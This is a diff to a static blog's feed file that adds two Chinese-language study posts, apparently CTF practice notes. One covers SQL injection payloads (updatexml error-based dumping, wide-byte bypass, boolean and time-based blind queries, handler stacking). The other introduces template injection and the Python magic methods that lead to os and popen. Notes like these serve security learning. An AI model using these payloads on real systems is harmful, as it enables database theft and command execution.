@@ -4,6 +4,44 @@
   
   
   <entry>
+    <title>sql</title>
+    <link href="/kele6.github.io/2024/05/07/sql/"/>
+    <url>/kele6.github.io/2024/05/07/sql/</url>
+    
+    <content type="html"><![CDATA[<h1 id="注：字母不加符号-数字表名加-（如：1561651635）"><a href="#注：字母不加符号-数字表名加-（如：1561651635）" class="headerlink" title="注：字母不加符号 数字表名加&#96;&#96;（如：1561651635）"></a>注：字母不加符号 数字表名加&#96;&#96;（如：<code>1561651635</code>）</h1><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>一、updatexml()注入<br>updatexml(1,(concat(0x7e,(show databese()),0x7e)),0)</p><p>爆表名：updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’pikachu’ limit 0,1),0x7e),1)</p><p> table_schema是数据库名称</p><p>爆字段：updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;’pikachu’ limit 0,1),0x7e),1)</p><p>爆字段内容: updatexml(1,concat(0x7e,(select flag from users limit 0,1),0x7e),1)</p><p>二、extractvalue()</p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>+%df 将&#x2F;转换成GBK</p><p>\编码为%5C</p><p>BK编码的数据库，会将%df%5c识别为運字，这样\被%df给吃掉了，变成了一个汉字，这样的话，单引号就<br>有效了，就可以闭合前面的引号了，后面的or 1&#x3D;1#这样的注入语句又能成功执行了，如下：</p><p>select * from member where username &#x3D; ‘chao運’ or 1&#x3D;1 #’&#96; – 什么都查询到了</p><h1 id="偏移量注入（知道表名，未知列名）"><a href="#偏移量注入（知道表名，未知列名）" class="headerlink" title="偏移量注入（知道表名，未知列名）"></a>偏移量注入（知道表名，未知列名）</h1><p>利用union select tables.*</p><p>tables为表名 可以是users.* （users为表名）</p><h1 id="其他注入：1-加密注入-2-堆叠注入（使用；）-3-二次注入-4-中转注入-5-伪静态注入"><a href="#其他注入：1-加密注入-2-堆叠注入（使用；）-3-二次注入-4-中转注入-5-伪静态注入" class="headerlink" title="其他注入：1.加密注入 2.堆叠注入（使用；） 3.二次注入 4.中转注入 5.伪静态注入"></a>其他注入：1.加密注入 2.堆叠注入（使用；） 3.二次注入 4.中转注入 5.伪静态注入</h1><p>具体另看</p><h1 id="盲注（费力）"><a href="#盲注（费力）" class="headerlink" title="盲注（费力）"></a>盲注（费力）</h1><p>基于布尔型SQL盲注、基于时间型SQL盲注</p><h1 id="基于布尔型SQL盲注（base-on-bool）"><a href="#基于布尔型SQL盲注（base-on-bool）" class="headerlink" title="基于布尔型SQL盲注（base on bool）"></a>基于布尔型SQL盲注（base on bool）</h1><p>1.之前的思路不再适用，改为 select ascii(substr(database(),1,1))&gt;xx; 通过对比ascii码的长度，<br>判断出数据库表名的第一个字符。</p><p>2.我们同样可以使用length来判断表名的长度，判断出长<br>度后就能多次输入payload来爆破出每一个表名的字符。select length(database())&lt;xx;</p><p>注:substr()函数 substring – sub子集 string – 字符串 子字符串 </p><p>string(必需)规定要返回其中一部分的字符串。start(必需)规定在字符串的何处开始。length(可选)规定被<br>返回字符串的长度</p><h1 id="基于时间型SQL盲注（base-on-time）"><a href="#基于时间型SQL盲注（base-on-time）" class="headerlink" title="基于时间型SQL盲注（base on time）"></a>基于时间型SQL盲注（base on time）</h1><p>到base on time盲注下，输入上个演示中设置好的payload vince’ and ascii(substr(database(),1,1))&#x3D;112# ，返回的信息发现不存在注入点。此时，需要用时间盲注</p><p> 1’ and if(substr(database(),1,1)&#x3D;’X’ (猜测<br>点)’,sleep(10),null# 如果猜测真确，那么就会响应10秒，如果错误会立刻返回错误 </p><p> vince’ and if(substr(database(),1,1)&#x3D;’p’,sleep(10),null)# ,在web控制台下，判断出<br>database的表名的一个字符为p。通过这个办法我们就能逐步向下获取数据。判断猜解。</p><p>时间型盲注经常使用的函数： sleep(5)、benchmark(10000000,MD5(1)) benchmark是mysql的内置<br>函数，是将MD5(1)执行10000000次以达到延迟的效果</p><p>注：如果sleep被防御了，可以使用benchmark。</p><h1 id="MySQL特有：handler"><a href="#MySQL特有：handler" class="headerlink" title="MySQL特有：handler"></a>MySQL特有：handler</h1><p>1’;handler  <code>123</code>open ;handler <code>1&#39;;handler </code>123<code>read first;# 1&#39;;handler</code>123<code>open as</code>a<code>;handler </code>a&#96; read first;#</p><p>a 可加&#96;可不加  纯数字表一定要加·</p><h1 id="DNSlog方式"><a href="#DNSlog方式" class="headerlink" title="DNSlog方式"></a>DNSlog方式</h1><p>dnslog注入也可以称之为dns带外查询，Dns在域名解析时会在DNS服务器上留下域名和解析ip的记录，<br>可以在dns服务器上查询相应的dns解析记录，来获取我们想要的数据。</p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><img src="C:\blog\myblog\source_posts\sql\sql.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>练习ing</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>SSTI（模板注入）</title>
+    <link href="/kele6.github.io/2024/05/07/SSTI/"/>
+    <url>/kele6.github.io/2024/05/07/SSTI/</url>
+    
+    <content type="html"><![CDATA[<h2 id="SSTI，即服务器端模板注入漏洞-Server-Side-Template-Injection"><a href="#SSTI，即服务器端模板注入漏洞-Server-Side-Template-Injection" class="headerlink" title="SSTI，即服务器端模板注入漏洞(Server-Side Template Injection)"></a>SSTI，即服务器端模板注入漏洞(Server-Side Template Injection)</h2><p>​    在渲染模板时，代码不严谨并且没有对用户的输入做严格过滤，将导致SSTI漏洞，造成任意文件读取和RCE命令执行；</p><p>注入原理: 使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于 GET 请求参数 $_GET[“name”]。</p><p><img src="C:\blog\myblog\source_posts\SSTI\0cf553389ab34885b0ed3996c07ef2ae.png"></p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">__class__查找当前对象的当前类<br>__base__查找当前类的父类<br>__mro__查找当前类的所有继承类<br>__subclasses查找父类下的所以子类<br>__init__查看类是否重载，出现wrapper表示没有重载<br>__globals__以字典的形式返回当前对象的全部全局变量<br>__builtins__提供对python的所以内置标识符的直接访问<br>__getitem__    这个方法返回所给键对应的值。当对象是序列时，键是整数。当对象是映射时（字典），键是任意值。,可代替中括号，绕过中括号过滤<br>__popen__      通过创建一个管道，调用 fork 产生一个子进程，执行一个 shell 以运行命令来开启一个进程<br>os   os就是“operating system”的缩写,os模块提供的就是各种 Python 程序与操作系统进行交互的接口。通过使用os模块，一方面可以方便地与操作系统进行交互，另一方面页可以极大增强代码的可移植性<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>练习ing</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>杂记</title>
     <link href="/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/"/>
     <url>/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/</url>
